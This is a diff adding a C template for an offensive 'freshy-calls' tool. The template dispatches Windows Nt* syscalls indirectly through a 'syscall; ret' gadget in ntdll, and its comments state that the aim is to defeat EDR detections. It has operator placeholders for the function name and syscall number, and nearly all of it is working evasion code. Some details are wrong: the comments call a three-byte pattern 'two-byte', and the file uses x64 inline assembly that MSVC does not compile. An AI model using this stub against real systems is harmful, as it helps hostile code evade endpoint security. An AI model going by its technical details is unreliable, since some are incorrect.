@@ -1,0 +1,48 @@
+/* freshy_calls.c.j2 — reference template for `freshy-calls`
+ *
+ * Indirect syscall via an ntdll gadget: find a `syscall; ret` byte
+ * sequence inside ntdll + `jmp` to it. RIP during the syscall is in
+ * ntdll — matches every legitimate syscall. The attacker code never
+ * executes the `syscall` instruction itself, so EDR detections that
+ * trigger on syscall-from-non-ntdll fail.
+ *
+ * Operator substitutes:
+ *   {{nt_function}}      — the Nt* function to call (e.g. NtAllocateVirtualMemory)
+ *   {{ssn}}              — resolved syscall number (hex, e.g. 0x18)
+ *   {{arg_count}}        — number of args (passed in R10, RDX, R8, R9, stack)
+ *
+ * Build:
+ *   cl.exe /c freshy_calls.c
+ *
+ * The gadget-resolver + SSN-resolver live in the operator's harness
+ * (crummie5/FreshyCalls or a reimplementation). This template is the
+ * dispatch stub that uses them. */
+
+#include <windows.h>
+
+typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
+    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+
+/* Resolved at runtime: address of a `syscall; ret` sequence inside
+ * ntdll. The resolver walks ntdll's .text looking for the two-byte
+ * `0F 05 C3` pattern — it's abundant (every Nt stub ends with it). */
+extern void *gadget_addr;
+
+/* Resolve + stash before use. */
+void FreshyCalls_SetGadget(void *addr) {
+    gadget_addr = addr;
+}
+
+/* Dispatch via indirect call. The compiler emits
+ *   mov r10, rcx          ; stash first arg (Windows kernel ABI)
+ *   mov eax, <ssn>        ; SSN
+ *   jmp [gadget_addr]     ; indirect call to syscall;ret in ntdll
+ * so the `syscall` instruction executes with RIP inside ntdll. */
+__declspec(naked) NTSTATUS FreshyCalls_{{nt_function}}(
+    HANDLE a1, PVOID *a2, ULONG_PTR a3, PSIZE_T a4, ULONG a5, ULONG a6) {
+    __asm {
+        mov r10, rcx
+        mov eax, {{ssn}}
+        jmp qword ptr [gadget_addr]
+    }
+}
